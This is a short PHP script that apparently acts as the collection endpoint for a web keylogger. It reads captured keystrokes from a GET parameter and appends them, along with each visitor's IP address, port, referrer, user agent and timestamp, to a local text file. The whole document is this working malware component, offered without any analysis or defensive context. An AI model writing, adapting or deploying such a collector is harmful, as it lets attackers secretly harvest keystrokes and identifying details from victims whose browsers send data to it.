<?php
$Keylog = $_GET["c"];
$reffer = $_SERVER['HTTP_REFERER'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date ("l dS of F Y h:i:s A"); 
$port = $_SERVER['REMOTE_PORT']; 
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$file = fopen('data.txt', 'a');
fwrite($file, 'Ip: '.$ip."\n");
fwrite($file, 'Port: '.$port."\n");
fwrite($file, 'Refferer: '.$reffer."\n");
fwrite($file, 'User Agent: '.$user_agent."\n");
fwrite($file, 'Date: '.$date."\n");
fwrite($file, $Keylog."\n");
fwrite($file, "---------------------------\n\n");
fclose($file);
?>